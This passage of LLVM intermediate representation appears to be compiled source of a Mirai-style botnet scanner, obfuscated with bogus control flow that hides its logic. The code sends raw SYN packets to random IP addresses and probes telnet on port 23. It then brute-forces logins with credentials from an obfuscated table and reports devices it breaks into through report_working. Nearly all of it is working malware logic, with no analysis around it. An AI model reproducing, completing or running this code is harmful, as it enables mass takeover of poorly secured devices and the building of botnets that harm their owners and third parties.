  %1679 = load i32, i32* @x.53
  %1680 = load i32, i32* @y.54
  %1681 = sub i32 %1679, 1
  %1682 = mul i32 %1679, %1681
  %1683 = urem i32 %1682, 2
  %1684 = icmp eq i32 %1683, 0
  %1685 = icmp slt i32 %1680, 10
  %1686 = or i1 %1684, %1685
  br i1 %1686, label %originalBB254, label %originalBB254alteredBB

originalBB254:                                    ; preds = %originalBB254alteredBB, %1678
  %1687 = load i32, i32* @x.53
  %1688 = load i32, i32* @y.54
  %1689 = sub i32 %1687, 1
  %1690 = mul i32 %1687, %1689
  %1691 = urem i32 %1690, 2
  %1692 = icmp eq i32 %1691, 0
  %1693 = icmp slt i32 %1688, 10
  %1694 = or i1 %1692, %1693
  br i1 %1694, label %originalBBpart2256, label %originalBB254alteredBB

originalBBpart2256:                               ; preds = %originalBB254
  br label %1695

; <label>:1695:                                   ; preds = %originalBBpart2256, %1034
  br label %1696

; <label>:1696:                                   ; preds = %1695, %1022, %985
  %1697 = load i32, i32* %1, align 4
  %1698 = add nsw i32 %1697, 1
  store i32 %1698, i32* %1, align 4
  br label %957

; <label>:1699:                                   ; preds = %957
  br label %213

originalBBalteredBB:                              ; preds = %originalBB, %53
  %1700 = call i32 @util_local_addr()
  store i32 %1700, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %1701 = call i64 @time(i64* null) #6
  %1702 = trunc i64 %1701 to i32
  store i32 %1702, i32* @fake_time, align 4
  %1703 = call noalias i8* @calloc(i64 256, i64 296) #6
  %1704 = bitcast i8* %1703 to %struct.scanner_connection*
  store %struct.scanner_connection* %1704, %struct.scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %92
  %1705 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %1705, i32* @rsck, align 4
  %1706 = icmp eq i32 %1705, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %111
  call void @exit(i32 0) #8
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %138
  %1707 = load i32, i32* @rsck, align 4
  %1708 = call i32 @close(i32 %1707)
  call void @exit(i32 0) #8
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %217
  %1709 = load i32, i32* @fake_time, align 4
  store i32 %1709, i32* %10, align 4
  store i32 0, i32* %1, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %235
  %1710 = load i32, i32* %1, align 4
  %1711 = icmp slt i32 %1710, 384
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %287
  %1712 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %1713 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1712, i32 0, i32 9
  %1714 = load i32, i32* %1713, align 4
  %1715 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %1716 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1715, i32 0, i32 2
  store i32 %1714, i32* %1716, align 4
  %1717 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %1718 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1717, i32 0, i32 6
  store i16 0, i16* %1718, align 4
  %1719 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %1720 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %1721 = bitcast %struct.tcphdr* %1720 to i8*
  %1722 = call zeroext i16 @htons(i16 zeroext 20) #7
  %1723 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %1719, i8* %1721, i16 zeroext %1722, i32 20)
  %1724 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %1725 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1724, i32 0, i32 6
  store i16 %1723, i16* %1725, align 4
  %1726 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %1726, align 4
  %1727 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %1728 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1727, i32 0, i32 9
  %1729 = load i32, i32* %1728, align 4
  %1730 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %1731 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1730, i32 0, i32 0
  store i32 %1729, i32* %1731, align 4
  %1732 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %1733 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1732, i32 0, i32 1
  %1734 = load i16, i16* %1733, align 2
  %1735 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %1734, i16* %1735, align 2
  %1736 = load i32, i32* @rsck, align 4
  %1737 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %1738 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %1738, %struct.sockaddr** %1737, align 8
  %1739 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %1740 = load %struct.sockaddr*, %struct.sockaddr** %1739, align 8
  %1741 = call i64 @sendto(i32 %1736, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %1740, i32 16)
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %334
  %1742 = load i32, i32* %1, align 4
  %_ = shl i32 %1742, 1
  %_27 = sub i32 0, %1742
  %gen = add i32 %_27, 1
  %_28 = shl i32 %1742, 1
  %1743 = add nsw i32 %1742, 1
  store i32 %1743, i32* %1, align 4
  br label %originalBB26

originalBB33alteredBB:                            ; preds = %originalBB33, %391
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %415
  %1744 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %1745 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1744, i32 0, i32 0
  %1746 = load i16, i16* %1745, align 4
  %1747 = zext i16 %1746 to i32
  %1748 = call zeroext i16 @htons(i16 zeroext 23) #7
  %1749 = zext i16 %1748 to i32
  %1750 = icmp ne i32 %1747, %1749
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %456
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %473
  %1751 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %1752 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1751, i32 0, i32 4
  %1753 = load i16, i16* %1752, align 4
  %_46 = shl i16 %1753, 9
  %_47 = shl i16 %1753, 9
  %_48 = sub i16 0, %1753
  %gen49 = add i16 %_48, 9
  %_50 = shl i16 %1753, 9
  %1754 = lshr i16 %1753, 9
  %_51 = sub i16 %1754, 1
  %gen52 = mul i16 %_51, 1
  %_53 = sub i16 %1754, 1
  %gen54 = mul i16 %_53, 1
  %_55 = shl i16 %1754, 1
  %_56 = sub i16 %1754, 1
  %gen57 = mul i16 %_56, 1
  %_58 = sub i16 %1754, 1
  %gen59 = mul i16 %_58, 1
  %_60 = sub i16 %1754, 1
  %gen61 = mul i16 %_60, 1
  %_62 = shl i16 %1754, 1
  %1755 = and i16 %1754, 1
  %1756 = icmp ne i16 %1755, 0
  br label %originalBB45

originalBB66alteredBB:                            ; preds = %originalBB66, %505
  %1757 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %1758 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1757, i32 0, i32 4
  %1759 = load i16, i16* %1758, align 4
  %_67 = sub i16 %1759, 10
  %gen68 = mul i16 %_67, 10
  %1760 = lshr i16 %1759, 10
  %_69 = sub i16 %1760, 1
  %gen70 = mul i16 %_69, 1
  %1761 = and i16 %1760, 1
  %1762 = icmp ne i16 %1761, 0
  br label %originalBB66

originalBB74alteredBB:                            ; preds = %originalBB74, %554
  %1763 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %1764 = load i32, i32* %18, align 4
  %1765 = sext i32 %1764 to i64
  %1766 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1763, i64 %1765
  %1767 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1766, i32 0, i32 3
  %1768 = load i32, i32* %1767, align 8
  %1769 = icmp eq i32 %1768, 0
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %578
  %1770 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %1771 = load i32, i32* %18, align 4
  %1772 = sext i32 %1771 to i64
  %1773 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1770, i64 %1772
  store %struct.scanner_connection* %1773, %struct.scanner_connection** %22, align 8
  %1774 = load i32, i32* %18, align 4
  store i32 %1774, i32* %9, align 4
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %601
  %1775 = load i32, i32* %18, align 4
  %_83 = sub i32 0, %1775
  %gen84 = add i32 %_83, 1
  %1776 = add nsw i32 %1775, 1
  store i32 %1776, i32* %18, align 4
  br label %originalBB82

originalBB88alteredBB:                            ; preds = %originalBB88, %620
  %1777 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %1778 = icmp eq %struct.scanner_connection* %1777, null
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %640
  %1779 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %1780 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1779, i32 0, i32 8
  %1781 = load i32, i32* %1780, align 4
  %1782 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %1783 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1782, i32 0, i32 4
  store i32 %1781, i32* %1783, align 4
  %1784 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %1785 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1784, i32 0, i32 0
  %1786 = load i16, i16* %1785, align 4
  %1787 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %1788 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1787, i32 0, i32 5
  store i16 %1786, i16* %1788, align 8
  %1789 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  call void @setup_connection(%struct.scanner_connection* %1789)
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %689
  %1790 = load i32, i32* %1, align 4
  %1791 = icmp slt i32 %1790, 256
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %741
  %1792 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1793 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1792, i32 0, i32 8
  %1794 = load i8, i8* %1793, align 8
  %_101 = sub i8 0, %1794
  %gen102 = add i8 %_101, 1
  %_103 = sub i8 0, %1794
  %gen104 = add i8 %_103, 1
  %_105 = sub i8 %1794, 1
  %gen106 = mul i8 %_105, 1
  %_107 = shl i8 %1794, 1
  %_108 = sub i8 %1794, 1
  %gen109 = mul i8 %_108, 1
  %1795 = add i8 %1794, 1
  store i8 %1795, i8* %1793, align 8
  %1796 = zext i8 %1795 to i32
  %1797 = icmp eq i32 %1796, 10
  br label %originalBB100

originalBB113alteredBB:                           ; preds = %originalBB113, %771
  br label %originalBB113

originalBB117alteredBB:                           ; preds = %originalBB117, %793
  br label %originalBB117

originalBB121alteredBB:                           ; preds = %originalBB121, %846
  %1798 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1799 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1798, i32 0, i32 1
  %1800 = load i32, i32* %1799, align 8
  %_122 = sub i32 %1800, 64
  %gen123 = mul i32 %_122, 64
  %1801 = srem i32 %1800, 64
  %1802 = zext i32 %1801 to i64
  %_124 = sub i64 0, 1
  %gen125 = add i64 %_124, %1802
  %_126 = sub i64 1, %1802
  %gen127 = mul i64 %_126, %1802
  %_128 = shl i64 1, %1802
  %_129 = shl i64 1, %1802
  %_130 = sub i64 0, 1
  %gen131 = add i64 %_130, %1802
  %_132 = shl i64 1, %1802
  %_133 = shl i64 1, %1802
  %1803 = shl i64 1, %1802
  %1804 = getelementptr inbounds %struct.fd_set.30, %struct.fd_set.30* %5, i32 0, i32 0
  %1805 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1806 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1805, i32 0, i32 1
  %1807 = load i32, i32* %1806, align 8
  %_134 = sub i32 %1807, 64
  %gen135 = mul i32 %_134, 64
  %_136 = sub i32 %1807, 64
  %gen137 = mul i32 %_136, 64
  %_138 = shl i32 %1807, 64
  %_139 = sub i32 0, %1807
  %gen140 = add i32 %_139, 64
  %_141 = sub i32 0, %1807
  %gen142 = add i32 %_141, 64
  %_143 = sub i32 %1807, 64
  %gen144 = mul i32 %_143, 64
  %_145 = sub i32 0, %1807
  %gen146 = add i32 %_145, 64
  %_147 = sub i32 %1807, 64
  %gen148 = mul i32 %_147, 64
  %1808 = sdiv i32 %1807, 64
  %1809 = sext i32 %1808 to i64
  %1810 = getelementptr inbounds [16 x i64], [16 x i64]* %1804, i64 0, i64 %1809
  %1811 = load i64, i64* %1810, align 8
  %_149 = sub i64 %1811, %1803
  %gen150 = mul i64 %_149, %1803
  %_151 = shl i64 %1811, %1803
  %_152 = sub i64 0, %1811
  %gen153 = add i64 %_152, %1803
  %_154 = shl i64 %1811, %1803
  %_155 = sub i64 0, %1811
  %gen156 = add i64 %_155, %1803
  %_157 = shl i64 %1811, %1803
  %1812 = or i64 %1811, %1803
  store i64 %1812, i64* %1810, align 8
  %1813 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1814 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1813, i32 0, i32 1
  %1815 = load i32, i32* %1814, align 8
  %1816 = load i32, i32* %11, align 4
  %1817 = icmp sgt i32 %1815, %1816
  br label %originalBB121

originalBB161alteredBB:                           ; preds = %originalBB161, %883
  %1818 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1819 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1818, i32 0, i32 1
  %1820 = load i32, i32* %1819, align 8
  store i32 %1820, i32* %11, align 4
  br label %originalBB161

originalBB165alteredBB:                           ; preds = %originalBB165, %904
  br label %originalBB165

originalBB169alteredBB:                           ; preds = %originalBB169, %921
  br label %originalBB169

originalBB173alteredBB:                           ; preds = %originalBB173, %960
  %1821 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %1822 = load i32, i32* %1, align 4
  %1823 = sext i32 %1822 to i64
  %1824 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1821, i64 %1823
  store %struct.scanner_connection* %1824, %struct.scanner_connection** %7, align 8
  %1825 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1826 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1825, i32 0, i32 1
  %1827 = load i32, i32* %1826, align 8
  %1828 = icmp eq i32 %1827, -1
  br label %originalBB173

originalBB177alteredBB:                           ; preds = %originalBB177, %1057
  br label %originalBB177

originalBB181alteredBB:                           ; preds = %originalBB181, %1074
  %1829 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1830 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1829, i32 0, i32 6
  %1831 = load i32, i32* %1830, align 4
  %1832 = icmp eq i32 %1831, 256
  br label %originalBB181

originalBB185alteredBB:                           ; preds = %originalBB185, %1107
  %1833 = call i32* @__errno_location() #7
  store i32 0, i32* %1833, align 4
  %1834 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1835 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1834, i32 0, i32 1
  %1836 = load i32, i32* %1835, align 8
  %1837 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1838 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1837, i32 0, i32 7
  %1839 = getelementptr inbounds [256 x i8], [256 x i8]* %1838, i32 0, i32 0
  %1840 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1841 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1840, i32 0, i32 6
  %1842 = load i32, i32* %1841, align 4
  %1843 = sext i32 %1842 to i64
  %1844 = getelementptr inbounds i8, i8* %1839, i64 %1843
  %1845 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1846 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1845, i32 0, i32 6
  %1847 = load i32, i32* %1846, align 4
  %_186 = shl i32 256, %1847
  %_187 = sub i32 256, %1847
  %gen188 = mul i32 %_187, %1847
  %_189 = sub i32 256, %1847
  %gen190 = mul i32 %_189, %1847
  %1848 = sub nsw i32 256, %1847
  %1849 = call i32 @recv_strip_null(i32 %1836, i8* %1844, i32 %1848, i32 16384)
  store i32 %1849, i32* %32, align 4
  %1850 = load i32, i32* %32, align 4
  %1851 = icmp eq i32 %1850, 0
  br label %originalBB185

originalBB194alteredBB:                           ; preds = %originalBB194, %1152
  %1852 = call i32* @__errno_location() #7
  %1853 = load i32, i32* %1852, align 4
  %1854 = icmp ne i32 %1853, 11
  br label %originalBB194

originalBB198alteredBB:                           ; preds = %originalBB198, %1192
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %1209
  br label %originalBB202

originalBB206alteredBB:                           ; preds = %originalBB206, %1273
  br label %originalBB206

originalBB210alteredBB:                           ; preds = %originalBB210, %1290
  %1855 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1856 = call i32 @consume_pass_prompt(%struct.scanner_connection* %1855)
  store i32 %1856, i32* %33, align 4
  %1857 = icmp sgt i32 %1856, 0
  br label %originalBB210

originalBB214alteredBB:                           ; preds = %originalBB214, %1333
  %1858 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1859 = call i32 @consume_any_prompt(%struct.scanner_connection* %1858)
  store i32 %1859, i32* %33, align 4
  %1860 = icmp sgt i32 %1859, 0
  br label %originalBB214

originalBB218alteredBB:                           ; preds = %originalBB218, %1373
  call void @table_unlock_val(i8 zeroext 6)
  %1861 = call i8* @table_retrieve_val(i32 6, i32* %37)
  store i8* %1861, i8** %36, align 8
  %1862 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1863 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1862, i32 0, i32 1
  %1864 = load i32, i32* %1863, align 8
  %1865 = load i8*, i8** %36, align 8
  %1866 = load i32, i32* %37, align 4
  %1867 = sext i32 %1866 to i64
  %1868 = call i64 @send(i32 %1864, i8* %1865, i64 %1867, i32 16384)
  %1869 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1870 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1869, i32 0, i32 1
  %1871 = load i32, i32* %1870, align 8
  %1872 = call i64 @send(i32 %1871, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 6)
  %1873 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1874 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1873, i32 0, i32 3
  store i32 7, i32* %1874, align 8
  br label %originalBB218

originalBB222alteredBB:                           ; preds = %originalBB222, %1404
  br label %originalBB222

originalBB226alteredBB:                           ; preds = %originalBB226, %1445
  call void @table_unlock_val(i8 zeroext 7)
  %1875 = call i8* @table_retrieve_val(i32 7, i32* %41)
  store i8* %1875, i8** %40, align 8
  %1876 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1877 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1876, i32 0, i32 1
  %1878 = load i32, i32* %1877, align 8
  %1879 = load i8*, i8** %40, align 8
  %1880 = load i32, i32* %41, align 4
  %1881 = sext i32 %1880 to i64
  %1882 = call i64 @send(i32 %1878, i8* %1879, i64 %1881, i32 16384)
  %1883 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1884 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1883, i32 0, i32 1
  %1885 = load i32, i32* %1884, align 8
  %1886 = call i64 @send(i32 %1885, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 7)
  %1887 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1888 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1887, i32 0, i32 3
  store i32 9, i32* %1888, align 8
  br label %originalBB226

originalBB230alteredBB:                           ; preds = %originalBB230, %1496
  br label %originalBB230

originalBB234alteredBB:                           ; preds = %originalBB234, %1536
  %1889 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %1889)
  br label %originalBB234

originalBB238alteredBB:                           ; preds = %originalBB238, %1554
  br label %originalBB238

originalBB242alteredBB:                           ; preds = %originalBB242, %1574
  %1890 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1891 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1890, i32 0, i32 4
  %1892 = load i32, i32* %1891, align 4
  %1893 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1894 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1893, i32 0, i32 5
  %1895 = load i16, i16* %1894, align 8
  %1896 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1897 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1896, i32 0, i32 0
  %1898 = load %struct.scanner_auth*, %struct.scanner_auth** %1897, align 8
  call void @report_working(i32 %1892, i16 zeroext %1895, %struct.scanner_auth* %1898)
  %1899 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1900 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1899, i32 0, i32 1
  %1901 = load i32, i32* %1900, align 8
  %1902 = call i32 @close(i32 %1901)
  %1903 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1904 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1903, i32 0, i32 1
  store i32 -1, i32* %1904, align 8
  %1905 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1906 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1905, i32 0, i32 3
  store i32 0, i32* %1906, align 8
  br label %originalBB242

originalBB246alteredBB:                           ; preds = %originalBB246, %1611
  %1907 = load i32, i32* %33, align 4
  %1908 = icmp eq i32 %1907, 0
  br label %originalBB246

originalBB250alteredBB:                           ; preds = %originalBB250, %1631
  %1909 = load i32, i32* %33, align 4
  %1910 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1911 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1910, i32 0, i32 6
  %1912 = load i32, i32* %1911, align 4
  %1913 = icmp sgt i32 %1909, %1912
  br label %originalBB250

originalBB254alteredBB:                           ; preds = %originalBB254, %1678
  br label %originalBB254
}

declare i32 @util_local_addr() #3

declare void @rand_init() #3

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #2

; Function Attrs: noinline nounwind uwtable
define internal void @add_auth_entry(i8*, i8*, i16 zeroext) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i16 %2, i16* %6, align 2
  %8 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %9 = bitcast %struct.scanner_auth* %8 to i8*
  %10 = load i32, i32* @auth_table_len, align 4
  %11 = add nsw i32 %10, 1
  %12 = sext i32 %11 to i64
  %13 = mul i64 %12, 24
  %14 = call i8* @realloc(i8* %9, i64 %13) #6
  %15 = bitcast i8* %14 to %struct.scanner_auth*
  store %struct.scanner_auth* %15, %struct.scanner_auth** @auth_table, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call i8* @deobf(i8* %16, i32* %7)
  %18 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %19 = load i32, i32* @auth_table_len, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %18, i64 %20
  %22 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i32 0, i32 0
  store i8* %17, i8** %22, align 8
  %23 = load i32, i32* %7, align 4
  %24 = trunc i32 %23 to i8
  %25 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %26 = load i32, i32* @auth_table_len, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %25, i64 %27
  %29 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i32 0, i32 4
  store i8 %24, i8* %29, align 4
  %30 = load i8*, i8** %5, align 8
  %31 = call i8* @deobf(i8* %30, i32* %7)
  %32 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %33 = load i32, i32* @auth_table_len, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %32, i64 %34
  %36 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %35, i32 0, i32 1
  store i8* %31, i8** %36, align 8
  %37 = load i32, i32* %7, align 4
  %38 = trunc i32 %37 to i8
  %39 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %40 = load i32, i32* @auth_table_len, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %39, i64 %41
  %43 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %42, i32 0, i32 5
  store i8 %38, i8* %43, align 1
  %44 = load i16, i16* @auth_table_max_weight, align 2
  %45 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %46 = load i32, i32* @auth_table_len, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %45, i64 %47
  %49 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %48, i32 0, i32 2
  store i16 %44, i16* %49, align 8
  %50 = load i16, i16* @auth_table_max_weight, align 2
  %51 = zext i16 %50 to i32
  %52 = load i16, i16* %6, align 2
  %53 = zext i16 %52 to i32
  %54 = add nsw i32 %51, %53
  %55 = trunc i32 %54 to i16
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %57 = load i32, i32* @auth_table_len, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* @auth_table_len, align 4
  %59 = sext i32 %57 to i64
  %60 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i64 %59
  %61 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %60, i32 0, i32 3
  store i16 %55, i16* %61, align 2
  %62 = load i16, i16* %6, align 2
  %63 = zext i16 %62 to i32
  %64 = load i16, i16* @auth_table_max_weight, align 2
  %65 = zext i16 %64 to i32
  %66 = add nsw i32 %65, %63
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8, align 1
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  br label %6

; <label>:6:                                      ; preds = %originalBBpart272, %0
  %7 = call i32 @rand_next()
  store i32 %7, i32* %1, align 4
  %8 = load i32, i32* %1, align 4
  %9 = and i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* %2, align 1
  %11 = load i32, i32* %1, align 4
  %12 = lshr i32 %11, 8
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %3, align 1
  %15 = load i32, i32* %1, align 4
  %16 = lshr i32 %15, 16
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %4, align 1
  %19 = load i32, i32* %1, align 4
  %20 = lshr i32 %19, 24
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %5, align 1
  br label %23

; <label>:23:                                     ; preds = %6
  %24 = load i8, i8* %2, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 127
  br i1 %26, label %513, label %27

; <label>:27:                                     ; preds = %23
  %28 = load i32, i32* @x.57
  %29 = load i32, i32* @y.58
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %27
  %36 = load i8, i8* %2, align 1
  %37 = zext i8 %36 to i32
  %38 = icmp eq i32 %37, 0
  %39 = load i32, i32* @x.57
  %40 = load i32, i32* @y.58
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %38, label %513, label %47

